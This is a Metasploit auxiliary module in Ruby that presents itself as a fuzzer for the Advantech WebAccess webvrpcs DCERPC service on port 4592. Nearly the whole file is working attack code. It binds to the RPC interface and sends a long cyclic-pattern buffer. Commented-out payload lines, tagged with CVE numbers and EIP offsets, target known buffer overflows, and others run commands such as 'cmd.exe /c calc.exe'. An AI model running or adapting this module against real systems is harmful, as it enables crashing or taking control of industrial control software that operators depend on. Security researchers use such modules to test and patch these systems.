require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::DCERPC

  def initialize(info = {})
    super(update_info(info,	
      'Name'           => 'Advantech WebAccess webvrpcs Generic Fuzzer',
      'Description'    => %q{
        This module simply automates the fuzzing of the dcerpc endpoint given the appropiate opcode.
      },
      'Author'         => [ 'Mario Ceballos'],
      'License'        => 'BSD_LICENSE',
      'References'     =>
        [
          [ 'URL', 'https://www.zerodayinitiative.com/advisories/' ],
        ],
      'DisclosureDate' => 'Jan 5 2018'))

      register_options(
         [
#          OptString.new('CMD', [ true, 'The command to execute', 'calc.exe']),
          Opt::RPORT(4592),
        ],)
		
 end

 def run
   connect
   handle = dcerpc_handle('5d2b62aa-ee0a-4a95-91ae-b064fdb471fc', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])
   dcerpc_bind(handle)
   print_status("Bound to #{handle} ...")

   packet =  NDR.long(0)
   packet << NDR.long(0xc351)
   packet << NDR.long(0x04)

   begin
     resp = dcerpc.call(0x2, packet)
   rescue Rex::Proto::DCERPC::Exceptions::NoResponse
   ensure
   end

   begin

     resp = dcerpc.call(0x4, NDR.long(2))
     handle = resp.last(4).unpack('V').first
     buff = Rex::Text.pattern_create(0x1000)

     command =  NDR.long(handle)
     command << NDR.long(0x2711)
     command << NDR.long(0x204)
     command << NDR.long(0x204) 
     #command << "cnvlgxtag test,test,test,test,test,#{buff},test" # CVE-2019-13556
     #command << "bwdraw test test test test test #{buff}" # CVE-2018-14816 (AdvantechWebAccessUSANode8.2_20170817) 
     #command << "upandpr 0 #{buff}" # CVE-2018-14816 (AdvantechWebAccessUSANode8.2_20170817)
     #command << "bwstmps #{buff}" # CVE-2017-16724 (8.3.2)
     #command << "cmd.exe /c calc.exe"
     #command << "bwacctrsbatch -type 0 -inet adfaf -node #{buff} --wa"
     #command << "bwrpswd test #{buff} test test test test" # CVE-2017-16724
     #command << "bwnodeip test test test #{buff}" # CVE-2017-16724 (AdvantechWebAccessUSANode8.2_20170817)
     #command << "bwstwww #{buff}" # CVE-2017-16724 (8.3.2)
     #command << "bwwfaa #{buff}" # (AdvantechWebAccessUSANode8.2_20170817)
     #command << "jpegconv #{buff} test 0" # (8.3.2)
     #command << "screnc /f #{buff}" # CVE-2018-14816 (AdvantechWebAccessUSANode8.2_20170817)
     #command << "bwdnload #{buff} test 0" # (AdvantechWebAccessUSANode8.2_20170817)
     #command << "bwctrkrl #{buff} #{Rex::Text.rand_text_alpha_upper(10)} 0" # (AdvantechWebAccessUSANode8.2_20170817)
     #command << "bwclrptw #{buff},adfa,afadf,adfa" # (AdvantechWebAccessUSANode8.2_20170817)
     #command << "bwmakdir #{buff}" # CVE-2018-14816 (8.3.2) (eip = 3750)
     #command << "notify 127.0.0.1 #{buff} test 2105555555 test" # (AdvantechWebAccessUSANode8.2_20170817)
     #command << "notify2 127.0.0.1 #{buff} test 2105555555 test" # (AdvantechWebAccessUSANode8.2_20170817)
     #command << "bwprtscr #{buff}" # CVE-2018-7499
     #command << "bwrunmie 0 0 target=#{buff}" # CVE-2018-7499
     #command << "bwrpswd #{buff} test test test" # CVE-2017-16724 (eip=2712), works on 8.3.2
     command << NDR.long(0) * 125 
     #puts Rex::Text.to_hex_dump(command)
     #print_status "Sending command '#{datastore['CMD']}'..."
     print_status "Sending exploit buffer..."
     dcerpc_call(0x1,command)
   rescue Rex::Proto::DCERPC::Exceptions::NoResponse
   ensure
   end
   disconnect
end
end
